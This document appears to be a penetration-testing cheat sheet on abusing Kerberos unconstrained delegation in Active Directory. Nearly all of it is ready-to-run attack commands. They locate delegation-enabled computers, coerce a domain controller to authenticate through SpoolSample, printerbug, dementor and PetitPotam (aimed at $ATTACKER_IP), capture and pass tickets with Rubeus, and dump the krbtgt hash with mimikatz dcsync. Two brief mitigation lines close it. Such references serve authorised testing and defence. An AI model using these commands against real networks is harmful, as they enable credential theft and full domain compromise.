# Kerberos Delegation - Unconstrained Delegation

> The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user.

## SpoolService Abuse with Unconstrained Delegation

**Requirements**:
- Object with Property **Trust this computer for delegation to any service (Kerberos only)**
- Must have **ADS_UF_TRUSTED_FOR_DELEGATION**
- Must not have **ADS_UF_NOT_DELEGATED** flag

### Find delegation

```
# ADModule
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# bloodyAD
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' --attr sAMAccountName,userAccountControl

# ldapdomaindump
ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10
grep TRUSTED_FOR_DELEGATION domain_computers.grep

# netexec
nxc ldap 10.10.10.10 -u username -p password --trusted-for-delegation

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

### SpoolService Status

```
ls \\dc01\pipe\spoolss
python rpcdump.py DOMAIN/user:password@10.10.10.10
```

### Monitor with Rubeus

```
Rubeus.exe monitor /interval:1
```

### Force connect back from DC

```
# SpoolSample
.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB

# krbrelayx
printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>

# dementor
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
```

### Load the ticket

```
.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
mimikatz # sekurlsa::tickets
mimikatz # lsadump::dcsync /user:HACKER\krbtgt
```

## MS-EFSRPC Abuse with Unconstrained Delegation

```
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```

## Mitigation
- Ensure sensitive accounts cannot be delegated
- Disable the Print Spooler Service
